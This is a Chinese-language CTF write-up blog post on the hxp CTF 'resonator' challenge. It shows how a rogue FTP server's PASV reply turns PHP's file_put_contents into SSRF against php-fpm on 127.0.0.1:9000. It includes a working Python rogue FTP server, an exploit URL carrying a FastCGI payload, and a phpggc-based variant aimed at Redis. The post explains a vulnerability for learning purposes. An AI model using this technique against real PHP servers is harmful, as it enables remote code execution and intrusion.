@@ -1,0 +1,174 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>hxp CTF resonator Writeup - SSRF via file_put_contents - rmb122's notebook</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="题目简介
+在刚结束的 hxpCTF 中出现了一题跟 🍊 的 One line php challenge 一样短小精悍但非常有趣的题目.
+长度只有五行,"><meta property="og:image" content><meta property="og:title" content="hxp CTF resonator Writeup - SSRF via file_put_contents"><meta property="og:description" content="题目简介
+在刚结束的 hxpCTF 中出现了一题跟 🍊 的 One line php challenge 一样短小精悍但非常有趣的题目.
+长度只有五行,"><meta property="og:type" content="article"><meta property="og:url" content="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-12-30T15:02:46+00:00"><meta property="article:modified_time" content="2020-12-30T15:02:46+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="hxp CTF resonator Writeup - SSRF via file_put_contents"><meta name=twitter:description content="题目简介
+在刚结束的 hxpCTF 中出现了一题跟 🍊 的 One line php challenge 一样短小精悍但非常有趣的题目.
+长度只有五行,"><script src=https://rmb122.com/js/feather.min.js></script>
+<link rel=stylesheet type=text/css media=screen href=https://rmb122.com/css/main.21410c161c7e5bcadc5a4eccf49ce5a024e0e8fc19babbd534cfe87972f5ee51.css><link id=darkModeStyle rel=stylesheet type=text/css href=https://rmb122.com/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css disabled></head><body><div class=content><header><div class=main><a href=https://rmb122.com/>rmb122's notebook</a></div><nav><a href=/>首页</a>&nbsp;
+<a href=/tags>标签</a>&nbsp;
+<a href=/posts>归档</a>&nbsp;
+<a href=/about>关于</a>&nbsp;
+<a href=/links>友链</a>
+| <a id=dark-mode-toggle onclick=toggleTheme() href></a>
+<script src=https://rmb122.com/js/themetoggle.js></script></nav></header><main><article><div class=title><h1 class=title>hxp CTF resonator Writeup - SSRF via file_put_contents</h1><div class=meta>发表于 2020 年 12 月 30 日</div></div><section class=body><h2 id=题目简介>题目简介</h2><p>在刚结束的 hxpCTF 中出现了一题跟 🍊 的 One line php challenge 一样短小精悍但非常有趣的题目.
+长度只有五行,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ff79c6>&lt;?</span>php
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$file</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_GET</span>[<span style=color:#f1fa8c>&#39;file&#39;</span>] <span style=color:#ff79c6>??</span> <span style=color:#f1fa8c>&#39;/tmp/file&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>$data</span> <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>$_GET</span>[<span style=color:#f1fa8c>&#39;data&#39;</span>] <span style=color:#ff79c6>??</span> <span style=color:#f1fa8c>&#39;:)&#39;</span>;
+</span></span><span style=display:flex><span>file_put_contents(<span style=color:#8be9fd;font-style:italic>$file</span>, <span style=color:#8be9fd;font-style:italic>$data</span>);
+</span></span><span style=display:flex><span><span style=color:#ff79c6>echo</span> file_get_contents(<span style=color:#8be9fd;font-style:italic>$file</span>);
+</span></span></code></pre></div><p>乍一看不是直接任意文件读和写了么, 我们再看看他的 Dockerfile</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dockerfile data-lang=dockerfile><span style=display:flex><span><span style=color:#ff79c6>RUN</span> rm -rf /var/www/html/*
+</span></span><span style=display:flex><span><span style=color:#ff79c6>COPY</span> docker-stuff/default /etc/nginx/sites-enabled/default
+</span></span><span style=display:flex><span><span style=color:#ff79c6>COPY</span> docker-stuff/www.conf /etc/php/7.3/fpm/pool.d/www.conf
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>COPY</span> flag.txt docker-stuff/readflag /
+</span></span><span style=display:flex><span><span style=color:#ff79c6>RUN</span> chown 0:1337 /flag.txt /readflag <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#f1fa8c>\
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c></span>    chmod <span style=color:#bd93f9>040</span> /flag.txt <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#f1fa8c>\
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c></span>    chmod <span style=color:#bd93f9>2555</span> /readflag
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>COPY</span> index.php /var/www/html/
+</span></span><span style=display:flex><span><span style=color:#ff79c6>RUN</span> chown -R root:root /var/www <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#f1fa8c>\
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c></span>    find /var/www -type d -exec chmod <span style=color:#bd93f9>555</span> <span style=color:#ff79c6>{}</span> <span style=color:#f1fa8c>\;</span> <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#f1fa8c>\
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c></span>    find /var/www -type f -exec chmod <span style=color:#bd93f9>444</span> <span style=color:#ff79c6>{}</span> <span style=color:#f1fa8c>\;</span>
+</span></span></code></pre></div><p>www.conf</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#ff79c6>[www]</span>
+</span></span><span style=display:flex><span><span style=color:#50fa7b>user</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>www-data</span>
+</span></span><span style=display:flex><span><span style=color:#50fa7b>group</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>www-data</span>
+</span></span><span style=display:flex><span><span style=color:#50fa7b>listen</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>127.0.0.1:9000</span>
+</span></span><span style=display:flex><span><span style=color:#50fa7b>listen.owner</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>www-data</span>
+</span></span><span style=display:flex><span><span style=color:#50fa7b>listen.group</span> <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>www-data</span>
+</span></span></code></pre></div><p>题目限制了 flag 和 WEB 目录的权限, 无法直接读 flag 和写 webshell, 需要 getshell 后运行 readflag 才行. 根据 php-fpm 特意设置了端口监听, 很大可能就是需要 SSRF fastcgi 后 getshell.
+但这样一看, 似乎就直接无解了, 虽然存在 fastcgi 监听在 9000 端口, 但是单单凭借 file_get_contents 的几个协议, 无法控制传递的内容, php-fpm 在收到无效数据后会直接中断链接. 存在可能的是 file_put_contents, 我们可以完整控制第二个参数.</p><h2 id=ssrf-via-file_put_contents>SSRF via file_put_contents</h2><p>接下来就需要介绍本篇文章的重点, 通过 file_put_contents 来达到 SSRF 目的.
+我们先看看 php 所支持的协议</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>file:// — Accessing local filesystem
+</span></span><span style=display:flex><span>http:// — Accessing HTTP(s) URLs
+</span></span><span style=display:flex><span>ftp:// — Accessing FTP(s) URLs
+</span></span><span style=display:flex><span>php:// — Accessing various I/O streams
+</span></span><span style=display:flex><span>zlib:// — Compression Streams
+</span></span><span style=display:flex><span>data:// — Data (RFC 2397)
+</span></span><span style=display:flex><span>glob:// — Find pathnames matching pattern
+</span></span><span style=display:flex><span>phar:// — PHP Archive
+</span></span><span style=display:flex><span>ssh2:// — Secure Shell 2
+</span></span><span style=display:flex><span>rar:// — RAR
+</span></span><span style=display:flex><span>ogg:// — Audio streams
+</span></span><span style=display:flex><span>expect:// — Process Interaction Streams
+</span></span></code></pre></div><p>ssh2, rar, ogg, expect 都需要额外安装 PCEL 扩展, 再排除 glob, data, zlib, php 这些明显没有太大攻击面的协议. 实际上有可能利用的协议只有 file, http, ftp, phar 这四种.
+文件系统层面的漏洞由于大部分目录都不可以写, 可以排除 file, 而 http 无法用于 file_put_contents 也可以排除. phar 没有已知的原生 php 利用链, 同样可以排除, 最后留下的只有 ftp 协议.</p><p>ftp 协议相对比较复杂, 其中存在一个特性, 相信大家都听说过, 就是 ftp 的数据端口和指令端口是分开的, 我们平时所说的 21 号端口其实是 ftp 的指令端口, 用于发送指令, 比如认证用户和指定读取的文件. 但是如果是传输文件的内容, ftp 实际上会重新打开一个链接, 同时还分为两种模式, 被动模式和主动模式.</p><p>这里 wikipedia 讲的比较清楚, 我直接复制一段过来</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>FTP有两种使用模式：主动和被动。主动模式要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题。所以，创立了被动模式。被动模式只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。
+</span></span></code></pre></div><p>注意 <code>被动模式只要求服务器端产生一个监听相应端口的进程</code>, 这里有非常重要的一点, 这个被动模式的端口是服务器指定的, 而且还有一点是很多地方没有提到的, 实际上除了端口, 服务器的地址也是可以被指定的. 由于 ftp 和 http 类似, 协议内容全是纯文本, 我们可以很清晰的看到它是如何指定地址和端口的</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>227 Entering Passive Mode(192,168,9,2,4,8)
+</span></span></code></pre></div><p>227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语, 而 (192,168,9,2,4,8) 代表让客户端连接 192.168.9.2 的 4 * 256 + 8 = 1032 端口.
+这样这个如何利用就很明显了, file_put_contents 在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的 pasv 模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到 127.0.0.1:9000. 同时由于 ftp 的特性, 不会有任何的多余内容, 类似 gopher 协议, 会将 data 原封不动的发给 127.0.0.1:9000, 完美符合攻击 fastcgi 的要求.</p><h2 id=利用脚本>利用脚本</h2><p>server.py</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> socket
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f1fa8c>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>Usage: python3 exp.py local_port target_ip target_port
+</span></span></span><span style=display:flex><span><span style=color:#f1fa8c>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>lport <span style=color:#ff79c6>=</span> <span style=color:#8be9fd;font-style:italic>int</span>(sys<span style=color:#ff79c6>.</span>argv[<span style=color:#bd93f9>1</span>])
+</span></span><span style=display:flex><span>raddr <span style=color:#ff79c6>=</span> sys<span style=color:#ff79c6>.</span>argv[<span style=color:#bd93f9>2</span>]<span style=color:#ff79c6>.</span>replace(<span style=color:#f1fa8c>&#39;.&#39;</span>, <span style=color:#f1fa8c>&#39;,&#39;</span>)
+</span></span><span style=display:flex><span>rport <span style=color:#ff79c6>=</span> sys<span style=color:#ff79c6>.</span>argv[<span style=color:#bd93f9>3</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>server <span style=color:#ff79c6>=</span> socket<span style=color:#ff79c6>.</span>socket()
+</span></span><span style=display:flex><span>server<span style=color:#ff79c6>.</span>bind((<span style=color:#f1fa8c>&#39;0.0.0.0&#39;</span>, lport))
+</span></span><span style=display:flex><span>server<span style=color:#ff79c6>.</span>listen()
+</span></span><span style=display:flex><span>client, _ <span style=color:#ff79c6>=</span> server<span style=color:#ff79c6>.</span>accept()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;220 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
+</span></span><span style=display:flex><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;331 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
+</span></span><span style=display:flex><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;230 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
+</span></span><span style=display:flex><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;220 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
+</span></span><span style=display:flex><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;550 a</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
+</span></span><span style=display:flex><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;227 aa (</span><span style=color:#f1fa8c>{</span>raddr<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>,0,</span><span style=color:#f1fa8c>{</span>rport<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>encode()) <span style=color:#6272a4># 默认 php 会使用 EPSV 命令, 这个只能指定端口, 所以我们需要发送两次 227 让 php fallback 到 PASV 模式</span>
+</span></span><span style=display:flex><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#39;227 aa (</span><span style=color:#f1fa8c>{</span>raddr<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>,0,</span><span style=color:#f1fa8c>{</span>rport<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>)</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>encode())
+</span></span><span style=display:flex><span>client<span style=color:#ff79c6>.</span>send(<span style=color:#f1fa8c>b</span><span style=color:#f1fa8c>&#39;150 Ok</span><span style=color:#f1fa8c>\n</span><span style=color:#f1fa8c>&#39;</span>)
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>http://target:8009/?file=ftp://your_server:19133/anything&amp;data={Gopherus 生成的 fastcgi payload}
+</span></span></code></pre></div><h2 id=产生原因>产生原因</h2><p>我们可以在 <code>ext/standard/ftp_fopen_wrapper.c</code> 查看到相关源码,</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff79c6>static</span> <span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span> <span style=color:#50fa7b>php_fopen_do_pasv</span>(php_stream <span style=color:#ff79c6>*</span>stream, <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>ip, size_t ip_size, <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>**</span>phoststart)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd>char</span> tmp_line[<span style=color:#bd93f9>512</span>];
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd>int</span> result, i;
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span> portno;
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd>char</span> <span style=color:#ff79c6>*</span>tpath, <span style=color:#ff79c6>*</span>ttpath, <span style=color:#ff79c6>*</span>hoststart<span style=color:#ff79c6>=</span><span style=color:#8be9fd;font-style:italic>NULL</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>#ifdef HAVE_IPV6
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>        <span style=color:#6272a4>/* We try EPSV first, needed for IPv6 and works on some IPv4 servers */</span>
+</span></span><span style=display:flex><span>        php_stream_write_string(stream, <span style=color:#f1fa8c>&#34;EPSV</span><span style=color:#f1fa8c>\r\n</span><span style=color:#f1fa8c>&#34;</span>);
+</span></span><span style=display:flex><span>        result <span style=color:#ff79c6>=</span> GET_FTP_RESULT(stream);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#6272a4>/* check if we got a 229 response */</span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (result <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>229</span>) {
+</span></span><span style=display:flex><span><span style=color:#ff79c6>#endif
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>                <span style=color:#6272a4>/* EPSV failed, let&#39;s try PASV */</span>
+</span></span><span style=display:flex><span>                php_stream_write_string(stream, <span style=color:#f1fa8c>&#34;PASV</span><span style=color:#f1fa8c>\r\n</span><span style=color:#f1fa8c>&#34;</span>);
+</span></span><span style=display:flex><span>                result <span style=color:#ff79c6>=</span> GET_FTP_RESULT(stream);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#6272a4>/* make sure we got a 227 response */</span>
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (result <span style=color:#ff79c6>!=</span> <span style=color:#bd93f9>227</span>) {
+</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#6272a4>/* parse pasv command (129, 80, 95, 25, 13, 221) */</span>
+</span></span><span style=display:flex><span>                tpath <span style=color:#ff79c6>=</span> tmp_line;
+</span></span><span style=display:flex><span>                <span style=color:#6272a4>/* skip over the &#34;227 Some message &#34; part */</span>
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>for</span> (tpath <span style=color:#ff79c6>+=</span> <span style=color:#bd93f9>4</span>; <span style=color:#ff79c6>*</span>tpath <span style=color:#ff79c6>&amp;&amp;</span> <span style=color:#ff79c6>!</span>isdigit((<span style=color:#8be9fd>int</span>) <span style=color:#ff79c6>*</span>tpath); tpath<span style=color:#ff79c6>++</span>);
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>!*</span>tpath) {
+</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                <span style=color:#6272a4>/* skip over the host ip, to get the port */</span>
+</span></span><span style=display:flex><span>                hoststart <span style=color:#ff79c6>=</span> tpath;
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>for</span> (i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>; i <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>4</span>; i<span style=color:#ff79c6>++</span>) {
+</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>for</span> (; isdigit((<span style=color:#8be9fd>int</span>) <span style=color:#ff79c6>*</span>tpath); tpath<span style=color:#ff79c6>++</span>);
+</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>*</span>tpath <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;,&#39;</span>) {
+</span></span><span style=display:flex><span>                                <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
+</span></span><span style=display:flex><span>                        }
+</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>*</span>tpath<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;.&#39;</span>;
+</span></span><span style=display:flex><span>                        tpath<span style=color:#ff79c6>++</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                tpath[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\0&#39;</span>;
+</span></span><span style=display:flex><span>                memcpy(ip, hoststart, ip_size);
+</span></span><span style=display:flex><span>                ip[ip_size<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\0&#39;</span>;
+</span></span><span style=display:flex><span>                hoststart <span style=color:#ff79c6>=</span> ip;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#6272a4>/* pull out the MSB of the port */</span>
+</span></span><span style=display:flex><span>                portno <span style=color:#ff79c6>=</span> (<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span>) strtoul(tpath, <span style=color:#ff79c6>&amp;</span>ttpath, <span style=color:#bd93f9>10</span>) <span style=color:#ff79c6>*</span> <span style=color:#bd93f9>256</span>;
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (ttpath <span style=color:#ff79c6>==</span> <span style=color:#8be9fd;font-style:italic>NULL</span>) {
+</span></span><span style=display:flex><span>                        <span style=color:#6272a4>/* didn&#39;t get correct response from PASV */</span>
+</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                tpath <span style=color:#ff79c6>=</span> ttpath;
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>*</span>tpath <span style=color:#ff79c6>!=</span> <span style=color:#f1fa8c>&#39;,&#39;</span>) {
+</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                tpath<span style=color:#ff79c6>++</span>;
+</span></span><span style=display:flex><span>                <span style=color:#6272a4>/* pull out the LSB of the port */</span>
+</span></span><span style=display:flex><span>                portno <span style=color:#ff79c6>+=</span> (<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span>) strtoul(tpath, <span style=color:#ff79c6>&amp;</span>ttpath, <span style=color:#bd93f9>10</span>);
+</span></span><span style=display:flex><span><span style=color:#ff79c6>#ifdef HAVE_IPV6
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>        } <span style=color:#ff79c6>else</span> {
+</span></span><span style=display:flex><span>                <span style=color:#6272a4>/* parse epsv command (|||6446|) */</span>
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>for</span> (i <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>, tpath <span style=color:#ff79c6>=</span> tmp_line <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>4</span>; <span style=color:#ff79c6>*</span>tpath; tpath<span style=color:#ff79c6>++</span>) {
+</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>if</span> (<span style=color:#ff79c6>*</span>tpath <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;|&#39;</span>) {
+</span></span><span style=display:flex><span>                                i<span style=color:#ff79c6>++</span>;
+</span></span><span style=display:flex><span>                                <span style=color:#ff79c6>if</span> (i <span style=color:#ff79c6>==</span> <span style=color:#bd93f9>3</span>)
+</span></span><span style=display:flex><span>                                        <span style=color:#ff79c6>break</span>;
+</span></span><span style=display:flex><span>                        }
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> (i <span style=color:#ff79c6>&lt;</span> <span style=color:#bd93f9>3</span>) {
+</span></span><span style=display:flex><span>                        <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                <span style=color:#6272a4>/* pull out the port */</span>
+</span></span><span style=display:flex><span>                portno <span style=color:#ff79c6>=</span> (<span style=color:#8be9fd>unsigned</span> <span style=color:#8be9fd>short</span>) strtoul(tpath <span style=color:#ff79c6>+</span> <span style=color:#bd93f9>1</span>, <span style=color:#ff79c6>&amp;</span>ttpath, <span style=color:#bd93f9>10</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span><span style=color:#ff79c6>#endif
+</span></span></span><span style=display:flex><span><span style=color:#ff79c6></span>        <span style=color:#ff79c6>if</span> (ttpath <span style=color:#ff79c6>==</span> <span style=color:#8be9fd;font-style:italic>NULL</span>) {
+</span></span><span style=display:flex><span>                <span style=color:#6272a4>/* didn&#39;t get correct response from EPSV/PASV */</span>
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>return</span> <span style=color:#bd93f9>0</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> (phoststart) {
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>*</span>phoststart <span style=color:#ff79c6>=</span> hoststart;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> portno;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>注意到</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>tpath[<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\0&#39;</span>;
+</span></span><span style=display:flex><span>memcpy(ip, hoststart, ip_size);
+</span></span><span style=display:flex><span>ip[ip_size<span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>] <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;\0&#39;</span>;
+</span></span><span style=display:flex><span>hoststart <span style=color:#ff79c6>=</span> ip;
+</span></span></code></pre></div><p>可以发现, 虽然在注释里面写了 <code>skip over the host ip, to get the port</code>, 但实际上还是没有 skip, 会将 PASV 给出的 ip 最后用于数据通道的连接, 导致漏洞产生.
+同时 php 还是用 <code>portno += (unsigned short) strtoul(tpath, &ttpath, 10);</code> 来获取的端口, 这也解释了为什么 (127,0,0,1,0,9000) 和 (127,0,0,1,35,40) 是一样的, 因为 php 底层并没有把他转换成 unsigned char 后再相加的 233</p><h2 id=real-world>Real World</h2><p>因为需要完整控制 filename 的关系, 这个漏洞在真实情况下比较不常见, 我觉得这个漏洞利用在反序列化上可能会更加好, 比如 phpggc 上存在的一个链 <code>SwiftMailer/FW1</code>, 我们将 <code>gadgetchains/SwiftMailer/FW/1/gadgets.php</code> 中的 <code>private $_mode = 'w+b';</code> 改成 <code>private $_mode = 'w';</code>, 这样使得 fopen 兼容 ftp 协议, 使得反序列化链正常进行.</p><p>然后利用的方式其实与 rouge_mysql_server 类似, 需要客户端连接我们的恶意服务器, 比如我们需要攻击 redis 服务, 首先在服务器上运行 <code>python3 server.py 19132 127.0.0.1 6379</code>, 再使用 <code>./phpggc SwiftMailer/FW1 "ftp://rouge_ftp_server:19132/asd" ssrf_payload_file</code> 来生成我们的序列化 payload, 在反序列化漏洞被触发后 ssrf_payload_file 中的内容就会被发往 127.0.0.1:6379.</p><p>这样就能扩展部分反序列化利用的方式, 比如在不知道 WEB 目录, 或者 WEB 目录不可写的情况下, 可以尝试 ssrf 一些 redis 服务, 扩大我们的攻击面.</p><h2 id=参考>参考</h2><ol><li><a href=https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE>https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE</a></li><li><a href=https://github.com/ambionics/phpggc>https://github.com/ambionics/phpggc</a></li><li><a href=https://github.com/php/php-src>https://github.com/php/php-src</a></li></ol></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/web>web</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 @rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>
